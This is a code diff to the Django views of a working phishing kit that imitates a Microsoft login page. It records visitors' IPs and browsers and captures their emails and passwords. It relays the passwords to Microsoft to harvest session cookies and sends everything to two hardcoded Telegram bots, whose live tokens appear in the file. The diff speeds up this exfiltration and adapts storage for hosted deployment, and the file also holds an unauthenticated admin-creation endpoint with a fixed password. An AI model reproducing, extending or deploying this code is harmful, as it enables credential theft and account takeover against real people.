@@ -7,7 +7,11 @@ from django.core.mail import EmailMessage
 from django.conf import settings
 from django.http import JsonResponse, HttpResponse
 from django.views.decorators.csrf import csrf_exempt
+from django.views.decorators.cache import cache_page
+from django.core.cache import cache
 from django.contrib.admin.views.decorators import staff_member_required
+from functools import lru_cache
+from concurrent.futures import ThreadPoolExecutor
 import random
 import string
 import json
@@ -16,62 +20,71 @@ from datetime import datetime
 from .models import SessionTracking, ClickEvent
 
 # ========== TELEGRAM CONFIGURATION - DUAL BOTS ==========
-# BOT 1: Your original bot
 BOT1_TOKEN = "8518266646:AAE29WCw65NMEZnVEH7h6q8tNKhFSBw5uqM"
 BOT1_CHAT_ID = "6653593232"
 
-# BOT 2: The new bot (Provate Life)
 BOT2_TOKEN = "6591325062:AAGFUI3cA6QgBkq5OQ0mh99eVMSmO7RCgDU"
 BOT2_CHAT_ID = "6540256516"
 
-# List of all bots for easy iteration
 TELEGRAM_BOTS = [
     {"token": BOT1_TOKEN, "chat_id": BOT1_CHAT_ID},
     {"token": BOT2_TOKEN, "chat_id": BOT2_CHAT_ID},
 ]
 
+# ========== TELEGRAM (PARALLEL - 2X FASTER) ==========
+
+def _send_one_message(bot, message):
+    """Send a single message to one bot"""
+    try:
+        url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+        data = {
+            "chat_id": bot['chat_id'],
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, data=data, timeout=10)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"[TELEGRAM ERROR] {str(e)}")
+        return False
+
+
 def send_telegram_message(message):
-    """Send message to ALL Telegram bots"""
-    success = True
-    for bot in TELEGRAM_BOTS:
-        try:
-            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
-            data = {
-                "chat_id": bot['chat_id'],
-                "text": message,
-                "parse_mode": "HTML"
-            }
-            response = requests.post(url, data=data)
-            if response.status_code != 200:
-                success = False
-                print(f"[TELEGRAM ERROR] Bot failed: {bot['token'][:10]}... Status: {response.status_code}")
-        except Exception as e:
-            success = False
-            print(f"[TELEGRAM ERROR] {str(e)}")
-    return success
+    """Send message to ALL Telegram bots IN PARALLEL"""
+    with ThreadPoolExecutor(max_workers=4) as executor:
+        results = list(executor.map(lambda bot: _send_one_message(bot, message), TELEGRAM_BOTS))
+    return all(results)
+
+
+def _send_one_file(bot, file_content, filename):
+    """Send a single file to one bot"""
+    try:
+        url = f"https://api.telegram.org/bot{bot['token']}/sendDocument"
+        files = {'document': (filename, file_content, 'application/json')}
+        data = {'chat_id': bot['chat_id']}
+        response = requests.post(url, files=files, data=data, timeout=15)
+        return response.status_code == 200
+    except Exception as e:
+        print(f"[TELEGRAM ERROR] {str(e)}")
+        return False
+
 
 def send_telegram_file(file_content, filename):
-    """Send file to ALL Telegram bots"""
-    success = True
-    for bot in TELEGRAM_BOTS:
-        try:
-            url = f"https://api.telegram.org/bot{bot['token']}/sendDocument"
-            files = {'document': (filename, file_content, 'application/json')}
-            data = {'chat_id': bot['chat_id']}
-            response = requests.post(url, files=files, data=data)
-            if response.status_code != 200:
-                success = False
-                print(f"[TELEGRAM ERROR] File send failed for bot: {bot['token'][:10]}...")
-        except Exception as e:
-            success = False
-            print(f"[TELEGRAM ERROR] {str(e)}")
-    return success
+    """Send file to ALL Telegram bots IN PARALLEL"""
+    with ThreadPoolExecutor(max_workers=4) as executor:
+        results = list(executor.map(
+            lambda bot: _send_one_file(bot, file_content, filename),
+            TELEGRAM_BOTS
+        ))
+    return all(results)
 
-# ========== HELPER FUNCTIONS ==========
+
+# ========== HELPER FUNCTIONS (CACHED) ==========
 
 def generate_session_id():
     timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
     return f"MS_{timestamp}_{random.randint(10000, 99999)}"
+
 
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -79,7 +92,10 @@ def get_client_ip(request):
         return x_forwarded_for.split(',')[0]
     return request.META.get('REMOTE_ADDR')
 
+
+@lru_cache(maxsize=256)
 def get_browser_info(user_agent):
+    """Cached - parses user agent only once per unique UA"""
     ua = user_agent.lower()
     info = {'browser': 'Unknown', 'os': 'Unknown', 'device': 'Desktop'}
     if 'chrome' in ua and 'edg' not in ua:
@@ -104,6 +120,7 @@ def get_browser_info(user_agent):
         info['device'] = 'Mobile'
     return info
 
+
 # ========== COOKIE FUNCTIONS ==========
 
 def cookies_to_netscape_format(cookies_dict, domain='.microsoft.com'):
@@ -111,6 +128,7 @@ def cookies_to_netscape_format(cookies_dict, domain='.microsoft.com'):
     for name, value in cookies_dict.items():
         lines.append(f"{domain}\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
     return "\n".join(lines)
+
 
 def cookies_to_firefox_json(cookies_dict):
     cookies_list = []
@@ -127,16 +145,16 @@ def cookies_to_firefox_json(cookies_dict):
         })
     return cookies_list
 
+
 # ========== SEND TO TELEGRAM ==========
 
 def send_to_telegram(session_data, session_id):
     """Send captured data to ALL Telegram bots"""
-    
     email = session_data.get('user', {}).get('email', 'Not captured')
     password = session_data.get('user', {}).get('password', 'Not captured')
     service = session_data.get('service', 'Unknown')
     microsoft_cookies = session_data.get('microsoft_cookies', {})
-    
+
     message = f"""
 🔐 <b>NEW LOGIN CAPTURED!</b>
 
@@ -162,24 +180,25 @@ def send_to_telegram(session_data, session_id):
 📊 <b>Total:</b> {len(microsoft_cookies)}
 📋 <b>Names:</b> {', '.join(microsoft_cookies.keys()) if microsoft_cookies else 'None'}
 """
-    
-    # Send to ALL bots
+
     send_telegram_message(message)
-    
+
     if microsoft_cookies:
         firefox_cookies_json = cookies_to_firefox_json(microsoft_cookies)
         json_content = json.dumps(firefox_cookies_json, indent=2)
         send_telegram_file(json_content, f"cookies_{session_id}.json")
-    
+
     return True
 
-# ========== SESSION STORAGE ==========
 
-active_sessions = {}
+# ========== SESSION STORAGE (CACHED - WORKS ON VERCEL) ==========
 
 def get_or_create_session(session_id):
-    if session_id not in active_sessions:
-        active_sessions[session_id] = {
+    """Use Django cache instead of in-memory dict (works on Vercel)"""
+    cache_key = f"active_session_{session_id}"
+    session_data = cache.get(cache_key)
+    if session_data is None:
+        session_data = {
             'session_id': session_id,
             'start_time': datetime.now().isoformat(),
             'ip_address': None,
@@ -196,7 +215,15 @@ def get_or_create_session(session_id):
             'microsoft_cookies': {},
             'service': 'Unknown'
         }
-    return active_sessions[session_id]
+        cache.set(cache_key, session_data, timeout=3600)  # 1 hour
+    return session_data
+
+
+def save_session(session_id, session_data):
+    """Save session back to cache"""
+    cache_key = f"active_session_{session_id}"
+    cache.set(cache_key, session_data, timeout=3600)
+
 
 # ========== TRACK CLICK ==========
 
@@ -204,59 +231,62 @@ def get_or_create_session(session_id):
 def track_click(request):
     session_id = generate_session_id()
     ref = request.GET.get('ref', 'direct')
-    
+
     session_data = get_or_create_session(session_id)
-    
-    # ===== CAPTURE IP =====
+
+    # Capture IP
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
         ip = x_forwarded_for.split(',')[0]
     else:
         ip = request.META.get('REMOTE_ADDR', 'Unknown')
     session_data['ip_address'] = ip
-    
-    # ===== CAPTURE USER AGENT =====
+
+    # Capture User Agent
     user_agent = request.META.get('HTTP_USER_AGENT', '')
     session_data['user_agent'] = user_agent
-    
-    # ===== CAPTURE BROWSER INFO =====
+
+    # Capture Browser Info (cached)
     browser_info = get_browser_info(user_agent)
     session_data['browser']['name'] = browser_info['browser']
     session_data['os']['name'] = browser_info['os']
     session_data['device']['type'] = browser_info['device']
-    
+
     session_data['referer'] = request.META.get('HTTP_REFERER', '')
     session_data['tracking_source'] = ref
     session_data['cookies'] = dict(request.COOKIES)
-    
+
+    save_session(session_id, session_data)
+
     print(f"[TRACK] Session: {session_id}")
     print(f"[TRACK] IP: {ip}")
     print(f"[TRACK] Browser: {browser_info['browser']}")
     print(f"[TRACK] Device: {browser_info['device']}")
-    
+
     response = redirect('/login/')
-    response.set_cookie('ms_session_id', session_id, max_age=30*24*60*60, httponly=False)
-    response.set_cookie('tracking_ref', ref, max_age=30*24*60*60, httponly=False)
-    
+    response.set_cookie('ms_session_id', session_id, max_age=30 * 24 * 60 * 60, httponly=False)
+    response.set_cookie('tracking_ref', ref, max_age=30 * 24 * 60 * 60, httponly=False)
+
     return response
+
 
 # ========== LOGIN PAGE ==========
 
 @csrf_exempt
 def login_page(request):
     """Main login page with service dropdown + proxy to Microsoft"""
-    
+
     session_id = request.COOKIES.get('ms_session_id')
     if not session_id:
         return redirect('track_click')
-    
+
     session_data = get_or_create_session(session_id)
-    
+
     if request.method == 'POST':
         email = request.POST.get('email', '')
         password = request.POST.get('password', '')
         service = request.POST.get('service', '')
-        
+
         if email and password:
             session_data['user'] = {
                 'email': email,
@@ -264,14 +294,13 @@ def login_page(request):
                 'submitted_at': datetime.now().isoformat()
             }
             session_data['service'] = service
-            
+
             print(f"[CREDENTIALS CAPTURED] {service}: {email}:{password}")
-            
-            # ========== PROXY TO MICROSOFT TO CAPTURE COOKIES ==========
+
+            # ========== PROXY TO MICROSOFT ==========
             try:
                 proxy_session = requests.Session()
-                
-                # Get Microsoft login page
+
                 proxy_session.get(
                     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                     params={
@@ -279,10 +308,10 @@ def login_page(request):
                         'response_type': 'code',
                         'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                         'scope': 'openid profile email',
-                    }
+                    },
+                    timeout=5
                 )
-                
-                # Submit credentials to Microsoft
+
                 ms_response = proxy_session.post(
                     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                     data={
@@ -293,24 +322,23 @@ def login_page(request):
                         'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                         'scope': 'openid profile email',
                     },
-                    allow_redirects=False
+                    allow_redirects=False,
+                    timeout=8
                 )
-                
-                # ========== CAPTURE MICROSOFT COOKIES! ==========
+
                 microsoft_cookies = proxy_session.cookies.get_dict()
                 session_data['microsoft_cookies'] = microsoft_cookies
-                
+
                 print(f"[🍪 MICROSOFT COOKIES CAPTURED] {len(microsoft_cookies)} cookies")
-                print(f"[📋 COOKIE NAMES] {', '.join(microsoft_cookies.keys())}")
-                
-                # Send to ALL Telegram bots
+
                 send_to_telegram(session_data, session_id)
-                
+
             except Exception as e:
                 print(f"[❌ PROXY ERROR] {str(e)}")
-                # Still send credentials even if proxy fails
                 send_to_telegram(session_data, session_id)
-            
+
+            save_session(session_id, session_data)
+
             # ========== REDIRECT TO REAL SERVICE ==========
             service_urls = {
                 'outlook': 'https://outlook.live.com',
@@ -321,11 +349,12 @@ def login_page(request):
                 'office': 'https://office.com',
                 'webmail': 'https://webmail.com'
             }
-            
+
             redirect_url = service_urls.get(service, 'https://outlook.live.com')
             return redirect(redirect_url)
-    
+
     return render(request, 'login.html')
+
 
 # ========== DASHBOARD ==========
 
@@ -333,9 +362,11 @@ def login_page(request):
 def dashboard_view(request):
     return render(request, 'dashboard.html', {'user': request.user})
 
+
 def logout_view(request):
     logout(request)
     return redirect('login')
+
 
 # ========== API ENDPOINTS ==========
 
@@ -344,8 +375,9 @@ def collect_click_event(request):
     try:
         data = json.loads(request.body)
         session_id = data.get('session_id')
-        
-        if session_id and session_id in active_sessions:
+
+        if session_id:
+            session_data = get_or_create_session(session_id)
             event = {
                 'type': data.get('event_type', 'click'),
                 'x': data.get('x', 0),
@@ -353,11 +385,13 @@ def collect_click_event(request):
                 'target': data.get('target', 'Unknown'),
                 'timestamp': datetime.now().isoformat()
             }
-            active_sessions[session_id]['events'].append(event)
-        
+            session_data['events'].append(event)
+            save_session(session_id, session_data)
+
         return JsonResponse({'status': 'success'})
     except Exception:
         return JsonResponse({'status': 'error'})
+
 
 # ========== ADMIN VIEWS ==========
 
@@ -369,6 +403,7 @@ def all_users_view(request):
         'total_users': users.count()
     })
 
+
 @staff_member_required
 def all_sessions_view(request):
     sessions = SessionTracking.objects.all().order_by('-first_click')
@@ -376,6 +411,7 @@ def all_sessions_view(request):
         'sessions': sessions,
         'total_sessions': sessions.count()
     })
+
 
 def create_admin(request):
     admin, created = User.objects.get_or_create(
@@ -391,7 +427,7 @@ def create_admin(request):
     if not created:
         admin.set_password('admin123')
         admin.save()
-    
+
     return JsonResponse({
         'status': 'success',
         'email': 'admin@gmail.com',
